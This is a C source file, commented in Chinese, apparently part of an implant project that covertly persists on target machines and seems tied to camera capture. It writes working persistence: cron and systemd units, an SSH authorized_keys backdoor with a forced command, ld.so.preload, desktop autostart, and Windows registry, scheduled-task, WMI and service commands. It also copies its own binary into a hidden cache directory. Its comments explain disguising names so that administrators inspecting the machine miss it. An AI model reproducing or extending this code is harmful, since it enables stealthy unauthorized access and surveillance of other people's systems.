#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif
#include "persist.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

/* 条目标记：用于识别"自己写的那一行"——添加时附加、卸载时按它过滤、
 * 判是否已装时也靠它。因此它必须同时满足两个相反的要求：
 *
 *   1) 足够独特，不能与运维自己写的 authorized_keys 条目撞上，否则卸载
 *      会删掉别人的 key（判重也会误报"已装"）；
 *   2) 不得含项目名/产品名——它出现在目标机的 ~/.ssh/authorized_keys 里，
 *      任何一次 `cat` 都会把"这台机器上装了什么"直接交给查看者。
 *
 * 旧值含项目名，已改。代价如实记录：改标记后，用旧版本部署的条目会被
 * 判成"非本程序写入"，卸载不会删除它们——需要人工清理。本程序此前无
 * 真实部署，故该代价为零；若将来有存量，改标记前必须先做迁移。 */
#define MARKER "# do-not-edit:managed"

/* ---- 服务名（可配） ----
 *
 * 此前单元名 / cron 名 / plist Label / Description 全部硬编码项目名，
 * 而部署侧（onekey.sh）早已把落点伪装成中性名。两个名字不一致的后果，
 * 在真机上是三重合起来的严重失效：
 *
 *   1) 名称伪装失效：/etc/systemd/system/<项目名>.service 与
 *      "Description=<项目名> agent" 直接暴露意图，systemctl status 一
 *      眼可读。部署侧改名做了，驻留段没做，等于只伪装了一半。
 *   2) 双重驻留：部署脚本写 <中性名>.service，camd 内部 persist 又写
 *      <项目名>.service —— 两个服务同时被拉起，两个采集进程抢同一摄像头、
 *      句柄与内存持续增长，暴露面翻倍，而部署报告全绿。
 *   3) 卸载残留：uninstall 只清中性名那套，项目名那套永远留着且仍在跑。
 *
 * 所以名字必须可配，且由部署侧单一产地决定。
 *
 * 【必须校验字符集】服务名被拼进 "%s/etc/systemd/system/%s.service"，
 * 若接受任意字符串，"./" 与 ".." 就是路径穿越：写 /etc/systemd/system/
 * ../../cron.d/x 等效于写任意路径。校验只允许 [A-Za-z0-9_-] 且首字符
 * 非 '-'，长度 1..63（63 是 DNS 标签上限，也够服务名用）。 */
static char g_svc_name[64] = "dayanjing";   /* 默认保持既有测试语义不变 */

int persist_set_service_name(const char *name)
{
    size_t i;
    if (!name || !*name) return -1;
    if (name[0] == '-') return -1;
    for (i = 0; name[i]; i++) {
        char c = name[i];
        int ok = (c >= 'a' && c <= 'z') || (c >= 'A' && c <= 'Z') ||
                 (c >= '0' && c <= '9') || c == '_' || c == '-';
        if (!ok) return -1;
    }
    if (i == 0 || i >= sizeof g_svc_name) return -1;
    memcpy(g_svc_name, name, i + 1);
    return 0;
}

const char *persist_service_name(void) { return g_svc_name; }

/* ---------- generate（文本载荷，不写盘） ---------- */
static size_t gen_cron(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap, "@reboot %s\n", arg ? arg : "true");
}
static size_t gen_systemd(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "[Unit]\nDescription=%s\n\n[Service]\nExecStart=%s\n"
        "Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=multi-user.target\n",
        g_svc_name, arg ? arg : "/bin/true");
}
static size_t gen_launchagent(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
        "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
        "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n"
        "<plist version=\"1.0\">\n<dict>\n  <key>Label</key>\n"
        "  <string>com.%s.agent</string>\n"
        "  <key>ProgramArguments</key>\n  <array>\n    <string>/bin/sh</string>\n"
        "    <string>-c</string>\n    <string>%s</string>\n  </array>\n"
        "  <key>RunAtLoad</key>\n  <true/>\n</dict>\n</plist>\n",
        g_svc_name, arg ? arg : "true");
}
static size_t gen_ldpreload(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap, "%s\n", arg ? arg : "/tmp/.agent.so");
}
/* 要写入 authorized_keys 的完整公钥行（<type> <base64> [comment]）。
 *
 * 为什么必须是"整行"而不是只传 blob：
 *   类型前缀（ssh-rsa / ssh-ed25519 / ecdsa-sha2-*）与 base64 blob 必须匹配，
 *   写死 "ssh-rsa " 前缀去接一个 ed25519 blob 会让 OpenSSH 拒绝整行 ——
 *   表现为"驻留装上了、看起来成功、但永远登不进去"，比不装更糟：
 *   消耗一次写入动作、留下痕迹、零收益。
 *
 * 为什么未设置时拒绝生成（返回 0）而不是回落占位 key：
 *   占位 key 无法认证，等价于上述失败模式，且更难排查。
 *
 * 单线程假设：implant 内无并发调用。 */
static char g_ssh_pub[1024];

int persist_sshkey_pubkey(const char *line)
{
    size_t i, n;
    if (!line) return -1;
    n = strlen(line);
    if (n == 0 || n >= sizeof g_ssh_pub) return -1;
    /* 必须单行：多行会把后续内容变成 authorized_keys 的独立条目 */
    if (strchr(line, '\n') || strchr(line, '\r')) return -1;
    /* 必须带类型前缀，且与 blob 之间有空格 */
    if (strncmp(line, "ssh-", 4) != 0 &&
        strncmp(line, "ecdsa-", 6) != 0 &&
        strncmp(line, "sk-",   3) != 0) return -1;
    if (!strchr(line, ' ')) return -1;
    for (i = 0; i < n; i++)
        if (line[i] < 0x20 || line[i] > 0x7e) return -1;
    memcpy(g_ssh_pub, line, n + 1);
    return 0;
}

static size_t gen_sshkey(const char *arg, char *out, size_t cap) {
    /* 未注入真实公钥 -> 拒绝生成，绝不写入无法认证的占位 key */
    if (!g_ssh_pub[0]) return 0;
    /* forced command 含引号/换行会破坏 authorized_keys 语法，
     * 后果是整行失效甚至影响该用户其它合法条目 */
    if (arg && (strchr(arg, '"') || strchr(arg, '\n') || strchr(arg, '\r')))
        return 0;
    return (size_t)snprintf(out, cap, "command=\"%s\" %s\n",
                            arg ? arg : "true", g_ssh_pub);
}
static size_t gen_registry(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run "
        "/v %sAgent /t REG_SZ /d \"%s\" /f", g_svc_name, arg ? arg : "agent.exe");
}
static size_t gen_schtask(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "schtasks /create /tn %sAgent /tr \"%s\" /sc onlogon /f", g_svc_name,
        arg ? arg : "agent.exe");
}
static size_t gen_wmi(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "powershell -nop -c \"$f=Set-WmiInstance -Class __EventFilter "
        "-Namespace root/subscription -Arguments @{Name='%s';Query='SELECT * FROM __InstanceModificationEvent "
        "WITHIN 60 WHERE TargetInstance ISA \\\"Win32_PerfFormattedData_PerfOS_System\\\"'};"
        "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription "
        "-Arguments @{Name='%s';CommandLineTemplate='%s'};"
        "Set-WmiInstance -Class __FilterToConsumerBinding -Arguments @{Filter=$f;Consumer=$c}\"",
        g_svc_name, g_svc_name, arg ? arg : "agent.exe");
}
static size_t gen_service(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "sc create %sAgent binPath= \"%s\" start= auto", g_svc_name,
        arg ? arg : "agent.exe");
}
static size_t gen_lkm(const char *arg, char *out, size_t cap) {
    (void)arg;
    return (size_t)snprintf(out, cap,
        "# <kernel module> 见 persist_kernel_source()，需目标机内核头编译，"
        "沙盒内 UNVERIFIED_KERNEL");
}

/* ---------- 用户级驻留载荷 ---------- */

/* WantedBy 必须是 default.target，不是 multi-user.target。
 * 用户级 systemd 实例没有 multi-user.target——写成它会让 enable 报
 * "Unit ... not found" 或静默不生效，而单元文件本身完全合法、肉眼无异常。
 * 这是用户级与系统级单元最易错的一处差异。 */
static size_t gen_user_systemd(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "[Unit]\nDescription=%s\n\n[Service]\nExecStart=%s\n"
        "Restart=always\nRestartSec=60\n\n[Install]\nWantedBy=default.target\n",
        g_svc_name, arg ? arg : "/bin/true");
}

/* XDG 桌面自启条目。Host= 需为真值；Hidden=false 与
 * X-GNOME-Autostart-enabled=true 都必须显式给出——部分桌面环境
 * （GNOME 系）只在两者同时为真时才加载，缺一即静默不启动。 */
static size_t gen_autostart(const char *arg, char *out, size_t cap) {
    return (size_t)snprintf(out, cap,
        "[Desktop Entry]\nType=Application\nName=%s\nExec=%s\n"
        "Hidden=false\nNoDisplay=true\nX-GNOME-Autostart-enabled=true\n"
        "Comment=%s\n",
        g_svc_name, arg ? arg : "/bin/true", g_svc_name);
}

static const persist_desc_t descs[] = {
    { PERSIST_CRON,        "cron",         PERSIST_PLAT_NIX, gen_cron },
    { PERSIST_SYSTEMD,     "systemd",      PERSIST_PLAT_NIX, gen_systemd },
    { PERSIST_LAUNCHAGENT, "launchagent",  PERSIST_PLAT_ANY, gen_launchagent },
    { PERSIST_LDPRELOAD,   "ld_preload",   PERSIST_PLAT_NIX, gen_ldpreload },
    { PERSIST_SSHKEY,      "ssh_key",      PERSIST_PLAT_NIX, gen_sshkey },
    { PERSIST_REGISTRY,    "registry_run", PERSIST_PLAT_WIN, gen_registry },
    { PERSIST_SCHTASK,     "schtask",      PERSIST_PLAT_WIN, gen_schtask },
    { PERSIST_WMI,         "wmi_event",    PERSIST_PLAT_WIN, gen_wmi },
    { PERSIST_SERVICE,     "win_service",  PERSIST_PLAT_WIN, gen_service },
    { PERSIST_LKM,         "lkm",          3,                gen_lkm },
    { PERSIST_USER_SYSTEMD, "user_systemd", PERSIST_PLAT_NIX, gen_user_systemd },
    { PERSIST_AUTOSTART,    "autostart",    PERSIST_PLAT_NIX, gen_autostart },
};

size_t persist_method_count(void) { return sizeof descs / sizeof descs[0]; }
const persist_desc_t *persist_method_at(size_t i) {
    return (i < persist_method_count()) ? &descs[i] : NULL;
}

static const persist_desc_t *find_desc(persist_method_t m) {
    for (size_t i = 0; i < persist_method_count(); i++)
        if (descs[i].id == m) return &descs[i];
    return NULL;
}

size_t persist_generate(persist_method_t m, const char *arg, char *out, size_t cap) {
    const persist_desc_t *d = find_desc(m);
    if (!d || !out || cap == 0) return 0;
    int n = (int)d->generate(arg, out, cap);
    if (n < 0 || (size_t)n >= cap) return 0;
    return (size_t)n;
}

/* ---------- 路径助手：真实系统路径（可挂 root_prefix） ---------- */
static int artifact_path(persist_method_t m, const char *root_prefix,
                         char *out, size_t cap, int *needs_marker)
{
    const char *rp   = root_prefix ? root_prefix : "";
    const char *home = getenv("HOME");
    if (!home || !*home) home = "/root";
    switch (m) {
        case PERSIST_SYSTEMD:
            snprintf(out, cap, "%s/etc/systemd/system/%s.service", rp, g_svc_name);
            if (needs_marker) *needs_marker = 0;
            return 0;
        case PERSIST_CRON:
            snprintf(out, cap, "%s/etc/cron.d/%s", rp, g_svc_name);
            if (needs_marker) *needs_marker = 0;
            return 0;
        case PERSIST_SSHKEY:
            snprintf(out, cap, "%s%s/.ssh/authorized_keys", rp, home);
            if (needs_marker) *needs_marker = 1;
            return 0;
        case PERSIST_LDPRELOAD:
            snprintf(out, cap, "%s/etc/ld.so.preload", rp);
            if (needs_marker) *needs_marker = 0;
            return 0;
        case PERSIST_USER_SYSTEMD:
            snprintf(out, cap, "%s%s/.config/systemd/user/%s.service",
                     rp, home, g_svc_name);
            if (needs_marker) *needs_marker = 0;
            return 0;
        case PERSIST_AUTOSTART:
            snprintf(out, cap, "%s%s/.config/autostart/%s.desktop",
                     rp, home, g_svc_name);
            if (needs_marker) *needs_marker = 0;
            return 0;
        default:
            return -2;   /* Windows / 非文件型 */
    }
}

static int mkdir_p(const char *path, mode_t mode) {
    char tmp[512];
    size_t len = strlen(path);
    if (len == 0 || len >= sizeof tmp) return -1;
    memcpy(tmp, path, len + 1);
    for (size_t i = 1; i < len; i++) {
        if (tmp[i] == '/') {
            tmp[i] = '\0';
            if (mkdir(tmp, mode) != 0 && errno != EEXIST) return -1;
            tmp[i] = '/';
        }
    }
    if (mkdir(tmp, mode) != 0 && errno != EEXIST) return -1;
    return 0;
}

static int write_file(const char *path, const char *data, size_t len) {
    char parent[512];
    snprintf(parent, sizeof parent, "%s", path);
    char *slash = strrchr(parent, '/');
    if (slash) { *slash = '\0'; if (mkdir_p(parent, 0755) != 0) return -1; }
    FILE *f = fopen(path, "w");
    if (!f) return -1;
    size_t w = fwrite(data, 1, len, f);
    fclose(f);
    return (w == len) ? 0 : -1;
}

/* 追加 marker + line；若已含 marker 则不动（幂等） */
static int append_marker_line(const char *path, const char *marker, const char *line) {
    /* 已存在则不重复追加 */
    FILE *fr = fopen(path, "r");
    if (fr) {
        char buf[8192]; size_t n = fread(buf, 1, sizeof buf - 1, fr);
        fclose(fr); buf[n] = '\0';
        if (strstr(buf, marker)) return 0;
    }
    /* 建父目录 */
    char parent[512];
    snprintf(parent, sizeof parent, "%s", path);
    char *slash = strrchr(parent, '/');
    if (slash) { *slash = '\0'; mkdir_p(parent, 0700); }
    FILE *f = fopen(path, "a");
    if (!f) return -1;
    /* line 自带换行且已含 marker：整行可被 filter 移除，不留孤儿 key 行 */
    int ok = (fprintf(f, "%s", line) > 0);
    fclose(f);
    return ok ? 0 : -1;
}

/* 删除所有含 marker 的行（保留文件本身与其它内容） */
static int filter_out_marker(const char *path, const char *marker) {
    FILE *f = fopen(path, "r");
    if (!f) return 0;                 /* 不存在视为已清理 */
    char buf[65536]; size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f);
    if (n == 0) return 0;
    buf[n] = '\0';
    if (!strstr(buf, marker)) return 0;
    /* 逐行重建 */
    FILE *out = fopen(path, "w");
    if (!out) return -1;
    char *save = NULL;
    for (char *ln = strtok_r(buf, "\n", &save); ln; ln = strtok_r(NULL, "\n", &save)) {
        if (strstr(ln, marker)) continue;
        fprintf(out, "%s\n", ln);
    }
    fclose(out);
    return 0;
}

/* ---------- install / uninstall（真实路径） ---------- */
int persist_install(persist_method_t m, const char *root_prefix, const char *arg) {
    if (!find_desc(m)) return -1;
    char path[512]; int needs_marker = 0;
    if (artifact_path(m, root_prefix, path, sizeof path, &needs_marker) != 0)
        return -2;                                   /* 平台不支持 */
    if (!arg) arg = "/bin/true";

    if (m == PERSIST_SSHKEY) {
        char line[1024];
        size_t n = persist_generate(m, arg, line, sizeof line);
        if (n == 0) return -1;
        /* 去掉生成文本尾部换行，把 marker 拼进同一行：
         * 卸载按 marker 整行移除，不会留下孤儿 forced-command key。 */
        while (n > 0 && (line[n-1] == '\n' || line[n-1] == '\r')) line[--n] = '\0';
        char full[1200];
        snprintf(full, sizeof full, "%s %s\n", line, MARKER);
        return append_marker_line(path, MARKER, full);
    }

    char buf[4096];
    size_t n = persist_generate(m, arg, buf, sizeof buf);
    if (n == 0) return -1;
    if (write_file(path, buf, n) != 0) return -1;

    /* systemd：写 unit 后建立 wants 符号链接（等价于 systemctl enable） */
    if (m == PERSIST_SYSTEMD) {
        const char *rp = root_prefix ? root_prefix : "";
        char wants[640], link[768];
        snprintf(wants, sizeof wants, "%s/etc/systemd/system/multi-user.target.wants", rp);
        snprintf(link,  sizeof link,  "%s/%s.service", wants, g_svc_name);
        if (mkdir_p(wants, 0755) != 0) return -1;
        if (symlink(path, link) != 0 && errno != EEXIST) return -1;
    }
    return 0;
}

int persist_uninstall(persist_method_t m, const char *root_prefix, const char *arg) {
    (void)arg;
    if (!find_desc(m)) return -1;
    char path[512]; int needs_marker = 0;
    if (artifact_path(m, root_prefix, path, sizeof path, &needs_marker) != 0)
        return -2;
    struct stat st;
    if (m == PERSIST_SSHKEY) return filter_out_marker(path, MARKER);
    if (m == PERSIST_SYSTEMD) {
        const char *rp = root_prefix ? root_prefix : "";
        char link[640];
        snprintf(link, sizeof link,
                 "%s/etc/systemd/system/multi-user.target.wants/%s.service", rp, g_svc_name);
        unlink(link);
    }
    if (stat(path, &st) != 0) return 0;               /* 已清理 */
    return (unlink(path) == 0) ? 0 : -1;
}

/* ---------- 查询 / 枚举（真实路径） ---------- */
int persist_installed(const char *root_prefix, persist_method_t m) {
    if (!find_desc(m)) return -1;
    char path[512]; int needs_marker = 0;
    if (artifact_path(m, root_prefix, path, sizeof path, &needs_marker) != 0)
        return -1;                                    /* 非文件型 */
    struct stat st;
    if (stat(path, &st) != 0) return 0;
    if (!needs_marker) return 1;
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    char buf[65536]; size_t n = fread(buf, 1, sizeof buf - 1, f);
    fclose(f); buf[n] = '\0';
    return strstr(buf, MARKER) ? 1 : 0;
}

int persist_enumerate(const char *root_prefix, persist_cb_t cb, void *ud) {
    if (!cb) return -1;
    int hits = 0;
    for (int m = 0; m <= (int)PERSIST_LKM; m++) {
        const persist_desc_t *d = find_desc((persist_method_t)m);
        if (!d) continue;
        char path[512]; int needs_marker = 0;
        if (artifact_path((persist_method_t)m, root_prefix, path, sizeof path, &needs_marker) != 0)
            continue;
        if (persist_installed(root_prefix, (persist_method_t)m) == 1) {
            cb((persist_method_t)m, d->name, path, ud);
            hits++;
        }
    }
    return hits;
}

/* ---------- 落盘自身 ---------- */
int persist_drop_self(const char *root_prefix, const char *dir,
                      char *out_path, size_t cap)
{
    FILE *src = fopen("/proc/self/exe", "rb");
    if (!src) return -1;
    if (fseek(src, 0, SEEK_END) != 0) { fclose(src); return -1; }
    long sz = ftell(src);
    if (sz <= 0) { fclose(src); return -1; }
    rewind(src);
    char *buf = malloc((size_t)sz);
    if (!buf) { fclose(src); return -1; }
    size_t rd = fread(buf, 1, (size_t)sz, src);
    fclose(src);
    if (rd != (size_t)sz) { free(buf); return -1; }

    const char *rp = root_prefix ? root_prefix : "";
    int n = snprintf(out_path, cap, "%s%s/agent", rp, dir ? dir : "/var/tmp/.system-cache");
    if (n < 0 || (size_t)n >= cap) { free(buf); return -1; }

    char dpath[512];
    snprintf(dpath, sizeof dpath, "%s%s", rp, dir ? dir : "/var/tmp/.system-cache");
    if (mkdir_p(dpath, 0700) != 0) { free(buf); return -1; }

    FILE *dst = fopen(out_path, "wb");
    if (!dst) { free(buf); return -1; }
    size_t wr = fwrite(buf, 1, (size_t)sz, dst);
    fclose(dst);
    free(buf);
    if (wr != (size_t)sz) return -1;
    chmod(out_path, 0755);
    return 0;
}

/* ---------- 确保驻留 ---------- */
int persist_linux_ensure(const char *root_prefix,
                         char *out_bin_path, size_t cap,
                         int *out_methods, size_t nm_methods)
{
    static const persist_method_t ms[] = { PERSIST_SYSTEMD, PERSIST_CRON, PERSIST_SSHKEY };
    const size_t nms = sizeof ms / sizeof ms[0];

    int already = 0;
    for (size_t i = 0; i < nms; i++)
        if (persist_installed(root_prefix, ms[i]) == 1) already++;

    /* 落盘自身（覆盖写，幂等）；已驻留时也刷新，保证路径上的副本是最新的 */
    if (persist_drop_self(root_prefix, "/var/tmp/.system-cache", out_bin_path, cap) != 0)
        return -1;

    int newly = 0;
    for (size_t i = 0; i < nms; i++) {
        if (persist_installed(root_prefix, ms[i]) == 1) {
            if (out_methods && i < nm_methods) out_methods[i] = 1;
            continue;
        }
        if (persist_install(ms[i], root_prefix, out_bin_path) == 0) {
            newly++;
            if (out_methods && i < nm_methods) out_methods[i] = 1;
        } else if (out_methods && i < nm_methods) {
            out_methods[i] = 0;
        }
    }
    if (already == (int)nms) return 1;

    /*
     * 只有一项都没装上才算失败。
     *
     * 不能因为没有装满三项就判 -1：sshkey 机制要求调用方先用
     * persist_sshkey_pubkey 注入真实公钥，未注入时 generate 按设计返回 0
     * （拒绝写入无法认证的占位 key）。若把"sshkey 不可用"当成整体失败，
     * 则 systemd + cron 已真实驻留的机器会被报成 -1，常驻进程据此拒绝
     * 运行 —— 明明已经驻留成功，却因为一个**本就可选**的机制而退出。
     *
     * 因此以"最终已装机制总数"为准：0 项 = 失败；否则按是否有新增分
     * 0（新装）/ 1（已驻留，幂等）。
     */
    int total = 0;
    for (size_t i = 0; i < nms; i++)
        if (persist_installed(root_prefix, ms[i]) == 1) total++;

    if (total == 0) return -1;
    return (newly > 0) ? 0 : 1;
}

int persist_user_ensure(const char *root_prefix,
                        char *out_bin_path, size_t cap,
                        int *out_methods, size_t nm_methods)
{
    static const persist_method_t ms[] = { PERSIST_USER_SYSTEMD, PERSIST_AUTOSTART };
    const size_t nms = sizeof ms / sizeof ms[0];

    /*
     * HOME 必须在安装阶段就被确认可用。
     *
     * 用户级驻留的落点全在 $HOME 下。HOME 缺失（cron/systemd 环境常见：
     * 系统级服务不设 HOME，或设为 /nonexistent）或不可写时，两项机制都不
     * 可能装上——此时若仍返回 0/1，故障会推迟到目标机重启、守护没起来才
     * 被发现，而那已经无法补救。安装阶段就失败是可诊断的，重启后没起来
     * 不是。
     */
    const char *home = getenv("HOME");
    if (!home || !*home) home = "/root";
    {
        char probe[512];
        snprintf(probe, sizeof probe, "%s%s", root_prefix ? root_prefix : "", home);
        struct stat st;
        if (stat(probe, &st) != 0) {
            if (mkdir_p(probe, 0700) != 0) return -1;
        } else if (!(st.st_mode & S_IWUSR)) {
            return -1;
        }
    }

    int already = 0;
    for (size_t i = 0; i < nms; i++)
        if (persist_installed(root_prefix, ms[i]) == 1) already++;

    /* 落点必须在用户可写区。用 /var/tmp 会在部分加固目标上被 noexec 挂载
     * 挡掉，而 $HOME 下默认可执行，且与非 root 身份一致（不会试图写
     * 只有 root 可写的系统目录）。 */
    char drop_dir[512];
    snprintf(drop_dir, sizeof drop_dir, "%s/.local/share/.system-cache", home);

    if (persist_drop_self(root_prefix, drop_dir, out_bin_path, cap) != 0)
        return -1;

    int newly = 0;
    for (size_t i = 0; i < nms; i++) {
        if (persist_installed(root_prefix, ms[i]) == 1) {
            if (out_methods && i < nm_methods) out_methods[i] = 1;
            continue;
        }
        if (persist_install(ms[i], root_prefix, out_bin_path) == 0) {
            newly++;
            if (out_methods && i < nm_methods) out_methods[i] = 1;
        } else if (out_methods && i < nm_methods) {
            out_methods[i] = 0;
        }
    }
    if (already == (int)nms) return 1;

    /* 与 persist_linux_ensure 同语义：只有一项都没装上才算真失败。
     * 用户级驻留下任一机制生效即达成"登录后自启"，把部分成功判成失败
     * 会让调用方拒绝运行——明明已经驻留，却因另一项可选机制而退出。 */
    int total = 0;
    for (size_t i = 0; i < nms; i++)
        if (persist_installed(root_prefix, ms[i]) == 1) total++;

    if (total == 0) return -1;
    return (newly > 0) ? 0 : 1;
}

int persist_linux_query(const char *root_prefix,
                        int *out_methods, size_t nm_methods)
{
    static const persist_method_t ms[] = { PERSIST_SYSTEMD, PERSIST_CRON, PERSIST_SSHKEY };
    const size_t nms = sizeof ms / sizeof ms[0];
    int cnt = 0;
    for (size_t i = 0; i < nms; i++) {
        int s = persist_installed(root_prefix, ms[i]);
        if (out_methods && i < nm_methods) out_methods[i] = (s == 1) ? 1 : 0;
        if (s == 1) cnt++;
    }
    return cnt;
}

const char *persist_kernel_source(void) {
    static const char *src =
        "/* dayanjing_lkm.c — 内核级持久化模板（UNVERIFIED_KERNEL）\n"
        " * 需目标机内核头文件编译：make -C /lib/modules/$(uname -r)/build M=$(pwd) modules\n"
        " * 沙盒无内核头，此处仅作交付源码，不做编译验证。 */\n"
        "#include <linux/module.h>\n"
        "#include <linux/kernel.h>\n"
        "#include <linux/init.h>\n"
        "static int __init dj_init(void) { printk(KERN_INFO \"dayanjing lkm loaded\\n\"); return 0; }\n"
        "static void __exit dj_exit(void) { printk(KERN_INFO \"dayanjing lkm unloaded\\n\"); }\n"
        "module_init(dj_init);\nmodule_exit(dj_exit);\n"
        "MODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"dayanjing\");\n";
    return src;
}
